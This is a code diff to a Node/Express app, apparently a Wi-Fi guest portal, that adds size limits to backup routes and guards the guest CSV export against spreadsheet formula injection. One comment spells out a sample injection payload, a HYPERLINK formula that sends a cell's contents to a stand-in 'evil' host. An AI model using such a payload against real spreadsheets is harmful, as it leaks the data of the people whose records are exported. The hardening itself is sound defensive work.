@@ -637,7 +637,8 @@ function createApp(opts = {}) {
 
   // Backups: USB stick (via the root helper) and download/restore a file.
   const backups = mountBackupRoutes({
-    app, api, dataDir, mediaDir, store, version: pkg.version,
+    app, api, dataDir, mediaDir, store, version: pkg.version, maxUploadBytes,
+    maxRestoreBytes: opts.maxRestoreBytes,
     setupRequired: () => !data().settings.adminHash,
     onRestored: () => configureFeeds(),
   });
@@ -877,7 +878,14 @@ function createApp(opts = {}) {
 
   api.get('/portal/guests.csv', (req, res) => {
     const { guests } = readPortalFiles(dataDir);
-    const q = (x) => `"${String(x).replace(/"/g, '""')}"`;
+    // Guests type their own email address, and Excel and Numbers treat a cell
+    // starting = + - or @ as a formula — so `=HYPERLINK("http://evil/"&A1)@x.com`
+    // runs when a volunteer opens the file. A leading apostrophe makes it text.
+    const q = (x) => {
+      const s = String(x);
+      const risky = /^[=+\-@\t\r]/.test(s);
+      return `"${(risky ? `'${s}` : s).replace(/"/g, '""')}"`;
+    };
     const rows = [['connected_at', 'email', 'marketing_consent'], ...guests.map((g) => [g.at, g.email, g.consent ? 'yes' : 'no'])];
     res.set({ 'Content-Type': 'text/csv; charset=utf-8', 'Content-Disposition': 'attachment; filename="wifi-guests.csv"', 'Cache-Control': 'no-store' })
       .send(`${rows.map((r) => r.map(q).join(',')).join('\r\n')}\r\n`);
